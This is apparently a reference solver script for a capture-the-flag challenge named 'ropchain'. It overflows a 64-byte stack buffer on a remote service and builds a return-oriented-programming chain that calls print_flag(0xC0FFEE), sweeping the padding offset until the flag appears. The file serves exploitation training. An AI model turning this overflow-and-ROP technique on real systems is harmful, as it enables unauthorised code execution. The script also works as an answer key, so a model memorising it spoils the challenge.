"""Reference solver for ropchain: build a ROP chain to call print_flag(0xC0FFEE).

    python3 solve.py <host> <port>

The binary is non-PIE and prints the addresses of the `pop rdi ; ret` gadget and
print_flag on connect. The chain overwrites the saved return address with:

    [pop rdi ; ret] [0xC0FFEE] [print_flag]

The offset from the 64-byte buffer to the saved return address depends on the
frame layout, so we sweep a small range and stop when the flag comes back.
"""
import re
import socket
import struct
import sys
import time


def attempt(host, port, pad):
    s = socket.socket()
    s.connect((host, port))
    banner = b""
    s.settimeout(2)
    try:
        while b"name?" not in banner:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
    except socket.timeout:
        pass
    g = re.search(rb"pop_rdi gadget: (0x[0-9a-fA-F]+)", banner)
    p = re.search(rb"print_flag:\s+(0x[0-9a-fA-F]+)", banner)
    if not g or not p:
        s.close()
        return None
    pop_rdi = int(g.group(1), 16)
    print_flag = int(p.group(1), 16)
    chain = struct.pack("<QQQ", pop_rdi, 0xC0FFEE, print_flag)
    s.sendall(b"A" * pad + chain)
    time.sleep(0.2)
    out = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    m = re.search(rb"FLAG (flag\{[^}]*\})", out)
    return m.group(1).decode() if m else None


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    for pad in range(64, 121, 8):
        flag = attempt(host, port, pad)
        if flag:
            print(flag)
            return
    print("no offset in range worked", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
